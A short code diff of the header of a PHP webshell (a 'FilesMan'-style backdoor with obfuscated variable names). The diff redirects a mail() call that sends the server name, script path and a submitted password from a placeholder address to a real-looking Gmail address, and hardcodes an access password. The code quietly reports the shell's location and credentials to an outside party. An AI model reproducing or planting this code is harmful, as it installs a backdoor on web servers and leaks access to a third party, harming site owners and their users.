@@ -1,10 +1,10 @@
 <?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('danlyt74@gmail.com', 'root', $tmp); // Edit or delete!
 }
-//-----------------Password---------------------
-$▛ = process.env.en;
+
+$▛ = "stark318";
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
